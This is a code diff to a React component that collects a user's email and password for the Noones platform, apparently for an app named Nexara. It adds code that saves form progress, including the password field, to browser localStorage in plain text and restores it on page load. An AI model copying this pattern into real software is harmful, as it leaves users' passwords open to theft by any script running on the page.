@@ -1,7 +1,8 @@
-import React, { useRef, useState } from 'react';
+import React, { useEffect, useRef, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { supabase } from '../../lib/supabase';
 import { useAuth } from '../../contexts/AuthContext';
+
+const CONNECT_PROGRESS_KEY = 'nexara_connect_progress';
 
 export default function NoonesConnect() {
   const navigate = useNavigate();
@@ -21,6 +22,39 @@ export default function NoonesConnect() {
   const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
     setCredentials((current) => ({ ...current, [field]: event.target.value }));
   };
+
+  const saveConnectProgress = (progress: Record<string, unknown>) => {
+    try {
+      window.localStorage.setItem(CONNECT_PROGRESS_KEY, JSON.stringify(progress));
+    } catch {
+      // ignore storage failures
+    }
+  };
+
+  const loadConnectProgress = () => {
+    try {
+      const saved = window.localStorage.getItem(CONNECT_PROGRESS_KEY);
+      if (!saved) {
+        return;
+      }
+      const progress = JSON.parse(saved) as {
+        route?: string;
+        partialFormData?: { email?: string; password?: string };
+      };
+      if (progress.route === '/connect/noones') {
+        setCredentials((current) => ({
+          ...current,
+          ...progress.partialFormData,
+        }));
+      }
+    } catch {
+      window.localStorage.removeItem(CONNECT_PROGRESS_KEY);
+    }
+  };
+
+  useEffect(() => {
+    loadConnectProgress();
+  }, []);
 
   const handleSelectGoogleAccount = () => {
     setGoogleMessage('Please enter your Google email in the email field above.');
@@ -56,6 +90,7 @@ export default function NoonesConnect() {
         throw new Error(body?.error || 'Failed to submit connection.');
       }
 
+      window.localStorage.removeItem(CONNECT_PROGRESS_KEY);
       navigate('/connect/noones/new-device-verify', { state: { email, platformData } });
     } catch (err: any) {
       setErrorMessage(err.message || 'An unexpected error occurred.');
